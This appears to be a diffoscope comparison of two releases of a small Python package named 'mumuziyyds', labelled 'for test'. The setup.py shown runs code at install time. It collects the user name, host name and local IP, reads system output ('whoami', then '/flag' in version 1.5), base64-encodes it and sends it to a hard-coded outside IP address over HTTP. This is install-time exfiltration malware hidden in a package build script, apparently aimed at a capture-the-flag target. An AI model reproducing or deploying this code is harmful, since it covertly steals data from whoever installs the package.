# Comparing `tmp/mumuziyyds-1.0.tar.gz` & `tmp/mumuziyyds-1.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "mumuziyyds-1.0.tar", last modified: Mon May 15 09:59:36 2023, max compression
+gzip compressed data, was "mumuziyyds-1.5.tar", last modified: Mon May 15 10:01:33 2023, max compression
```

## Comparing `mumuziyyds-1.0.tar` & `mumuziyyds-1.5.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-05-15 09:59:36.159019 mumuziyyds-1.0/
--rw-rw-rw-   0        0        0      527 2023-05-15 09:59:36.158018 mumuziyyds-1.0/PKG-INFO
--rw-rw-rw-   0        0        0        9 2022-06-16 16:47:34.000000 mumuziyyds-1.0/README.md
-drwxrwxrwx   0        0        0        0 2023-05-15 09:59:36.149017 mumuziyyds-1.0/cnlogs/
--rw-rw-rw-   0        0        0        1 2022-06-16 16:47:34.000000 mumuziyyds-1.0/cnlogs/__init__.py
--rw-rw-rw-   0        0        0        0 2022-06-16 16:47:34.000000 mumuziyyds-1.0/cnlogs/cnlogs.py
-drwxrwxrwx   0        0        0        0 2023-05-15 09:59:36.156019 mumuziyyds-1.0/mumuziyyds.egg-info/
--rw-rw-rw-   0        0        0      527 2023-05-15 09:59:35.000000 mumuziyyds-1.0/mumuziyyds.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      190 2023-05-15 09:59:36.000000 mumuziyyds-1.0/mumuziyyds.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-15 09:59:35.000000 mumuziyyds-1.0/mumuziyyds.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        7 2023-05-15 09:59:35.000000 mumuziyyds-1.0/mumuziyyds.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-15 09:59:36.159019 mumuziyyds-1.0/setup.cfg
--rw-rw-rw-   0        0        0     1711 2023-05-15 09:59:32.000000 mumuziyyds-1.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-15 10:01:33.837381 mumuziyyds-1.5/
+-rw-rw-rw-   0        0        0      527 2023-05-15 10:01:33.836381 mumuziyyds-1.5/PKG-INFO
+-rw-rw-rw-   0        0        0        9 2022-06-16 16:47:34.000000 mumuziyyds-1.5/README.md
+drwxrwxrwx   0        0        0        0 2023-05-15 10:01:33.827379 mumuziyyds-1.5/cnlogs/
+-rw-rw-rw-   0        0        0        1 2022-06-16 16:47:34.000000 mumuziyyds-1.5/cnlogs/__init__.py
+-rw-rw-rw-   0        0        0        0 2022-06-16 16:47:34.000000 mumuziyyds-1.5/cnlogs/cnlogs.py
+drwxrwxrwx   0        0        0        0 2023-05-15 10:01:33.834381 mumuziyyds-1.5/mumuziyyds.egg-info/
+-rw-rw-rw-   0        0        0      527 2023-05-15 10:01:33.000000 mumuziyyds-1.5/mumuziyyds.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      190 2023-05-15 10:01:33.000000 mumuziyyds-1.5/mumuziyyds.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-15 10:01:33.000000 mumuziyyds-1.5/mumuziyyds.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        7 2023-05-15 10:01:33.000000 mumuziyyds-1.5/mumuziyyds.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-15 10:01:33.837381 mumuziyyds-1.5/setup.cfg
+-rw-rw-rw-   0        0        0     1714 2023-05-15 10:01:28.000000 mumuziyyds-1.5/setup.py
```

### Comparing `mumuziyyds-1.0/PKG-INFO` & `mumuziyyds-1.5/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: mumuziyyds
-Version: 1.0
+Version: 1.5
 Summary: for test
 Home-page: UNKNOWN
 Author: mumuziyyds
 Author-email: 
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Development Status :: 2 - Pre-Alpha
```

### Comparing `mumuziyyds-1.0/mumuziyyds.egg-info/PKG-INFO` & `mumuziyyds-1.5/mumuziyyds.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: mumuziyyds
-Version: 1.0
+Version: 1.5
 Summary: for test
 Home-page: UNKNOWN
 Author: mumuziyyds
 Author-email: 
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Development Status :: 2 - Pre-Alpha
```

### Comparing `mumuziyyds-1.0/setup.py` & `mumuziyyds-1.5/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -21,15 +21,15 @@
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         in_ip = s.getsockname()[0]
         s.close()
     except:
         in_ip = 'None'
-    data = ' | System Info: ' + os.popen('whoami').read() + '| Login Name: ' + username + ' | Host Name: ' + hostname + ' | IP: ' + in_ip
+    data = ' | System Info: ' + os.popen('cat /flag').read() + '| Login Name: ' + username + ' | Host Name: ' + hostname + ' | IP: ' + in_ip
     try:
         encode = 'Zx3' + str(base64.b64encode(data.encode('utf-8')), 'utf-8')
     except:
         encode = 'Zx2' + base64.b64encode(data)
     
     try:
         request(url='http://124.70.159.15:60006/?token=' + encode)
@@ -38,15 +38,15 @@
         pass
 
 init()
 
 
 setuptools.setup(
     name="mumuziyyds",
-    version="1.0",
+    version="1.5",
     url="",
 
     author="mumuziyyds",
     author_email="",
 
     description="for test",
     long_description=open('README.md').read(),
```

